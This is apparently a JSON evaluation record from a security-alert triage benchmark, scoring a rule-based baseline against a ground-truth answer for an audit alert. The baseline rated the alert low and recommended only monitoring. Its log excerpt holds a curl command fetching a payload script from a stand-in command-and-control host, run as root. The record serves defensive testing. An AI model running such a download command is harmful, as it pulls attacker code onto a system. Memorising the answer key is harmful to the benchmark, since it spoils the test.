@@ -1,0 +1,72 @@
+{
+  "alert_id": "eval-011",
+  "category": "audit_command",
+  "ground_truth": {
+    "is_true_positive": true,
+    "expected_severity": "high",
+    "expected_response": "contain",
+    "expected_key_indicators": [
+      "curl",
+      "malicious-c2.example.com",
+      "euid=0"
+    ],
+    "expected_mitre_tactic": "Execution",
+    "notes": "Downloading payload with elevated privileges"
+  },
+  "mode": "baseline",
+  "model": "baseline_rules",
+  "result": {
+    "summary": "[Baseline] Audit: Command executed. on target-1-compute",
+    "hypothesis": "Rule-based assessment: Audit: Command executed.. Severity info suggests monitor action.",
+    "possible_causes": [
+      "Audit: Command executed.",
+      "MITRE ATT&CK tactic: Execution"
+    ],
+    "key_indicators": [
+      "MITRE techniques: T1059",
+      "Log excerpt: type=EXECVE msg=audit(1712435700.000:1234): argc=2 a0=\"curl\" a1=\"http://malicious-c2.example.com/payload.sh\""
+    ],
+    "recommended_checks": [
+      "Verify the command was executed by an authorized user",
+      "Check the destination URL/host against threat intel",
+      "Review the user's recent command history"
+    ],
+    "confidence_note": "Low confidence — rule-based baseline without LLM contextual analysis. This assessment uses only Wazuh metadata and predefined heuristics.",
+    "criticality": {
+      "score": 1,
+      "level": "info",
+      "justification": "Based on Wazuh rule level (3), severity mapping: info → info",
+      "contributing_factors": [
+        "Wazuh rule level: 3",
+        "Rule groups: audit, audit_command",
+        "MITRE tactics: Execution"
+      ]
+    },
+    "response": {
+      "action": "monitor",
+      "urgency": "scheduled",
+      "specific_steps": [
+        "Verify the command was executed by an authorized user",
+        "Check the destination URL/host against threat intel",
+        "Review the user's recent command history"
+      ],
+      "escalation_needed": false,
+      "escalation_reason": null
+    }
+  },
+  "raw_response": "[baseline]",
+  "latency_ms": 0,
+  "prompt_tokens": 0,
+  "completion_tokens": 0,
+  "schema_valid": true,
+  "scores": {
+    "severity_match": false,
+    "response_match": false,
+    "indicator_coverage": 0.667,
+    "false_positive_correct": null,
+    "predicted_severity": "info",
+    "expected_severity": "high",
+    "predicted_action": "monitor",
+    "expected_action": "contain"
+  }
+}
